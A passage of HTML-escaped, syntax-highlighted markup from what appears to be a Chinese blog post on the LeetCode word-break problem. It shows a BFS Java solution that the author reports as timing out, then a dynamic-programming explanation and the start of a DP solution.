&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//BFS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setDict&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//记录当前层开始遍历字符串s的位置&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Queue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LinkedList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;poll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//如果字符串到遍历完了，自己返回true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;setDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;substring&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;queue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wb1-timeout.png&#34; alt=&#34;超时&#34; title=&#34;timeout QAQ&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;动态规划&#34;&gt;动态规划&lt;/h4&gt;
&lt;p&gt;我们又想到了动态规划，首先我们来看看dp的思考过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定问题的子结构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;检查字符串的前缀是否可以由字典中的单词组成&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确定状态&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;定义状态dp[i]来表示字符串s的前i个字符是否可以被字典中的单词组成&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;确定状态转移方程&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dp[i] = true，如果存在一个j（0 &amp;lt;= j &amp;lt; i），使得dp[j]是true，并且s的子串s[j:i]在字典中
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确定初始状态和边界情况
初始状态定义为dp[0] = true，意味着存在没有使用任何单词的情况&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;优化&#34;&gt;优化&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;迭代过程中，如果发现dp[i] == true ，直接break，其中在时间上通过限制内层循环的长度和提前退出循环增加了一些效率&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;代码&#34;&gt;代码&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Solution&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;wordBreak&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HashSet&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wordDict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;maxw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
